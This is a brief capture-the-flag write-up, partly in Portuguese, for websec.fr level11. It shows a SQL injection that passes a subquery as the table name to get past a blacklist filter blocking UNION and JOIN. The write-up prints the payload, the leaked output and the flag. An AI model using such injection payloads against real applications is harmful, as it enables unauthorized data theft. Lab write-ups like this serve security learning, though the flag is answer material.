# level11 - 1 point
[Link to the challenge](http://websec.fr/level11)

## Description
```
Serialization is a pain!
```
User 1 is likely Cap'tain flamg.
This application is used to view the username, with or without the costume, of superheroes, by id.
Also, I was told that super-heroes have enemies…

To prevent sql injections, it uses a super-efficient-blacklist-based filter!
No more nasty UNION or JOIN.
Check the source [here](source.php).

## Write-up
Passando user_id = 2 e $table = (SELECT 2 id,enemy username FROM costume)

Coluna do ID vai ter a constante 2 sendo exibida, mas todos os users estarão listados (com seu enemy AS username)

O SELECT mais externo vai pegar a coluna de id = 2, mas todas são de id 2 (constante 2 na coluna ID), assim a primeira coluna da lista será a do user de ID 1 e seu enemy contém a senha!!

```
The hero number 2 in (SELECT 2 id,enemy username FROM costume) is WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}. 
```

**FLAG: `WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}`**
